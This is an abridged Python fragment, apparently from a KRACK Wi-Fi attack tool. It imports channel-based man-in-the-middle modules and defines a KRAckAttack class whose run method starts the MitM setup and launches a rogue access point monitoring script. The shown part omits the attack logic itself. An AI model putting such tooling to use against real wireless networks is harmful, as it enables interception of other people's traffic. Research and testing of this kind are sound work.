...
from mitm_channel_based import log_messages
from mitm_channel_based.log_messages import *
from mitm_channel_based.packet_processing import *
from mitm_channel_based.wpaspy import *
...
class KRAckAttack():
	...
	def run(self, strict_echo_test=False):
		...
		self.mitmconfig.run()
		subprocess.Popen(["./monitor_rogue_ap_interface.sh", self.nic_rogue_ap], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
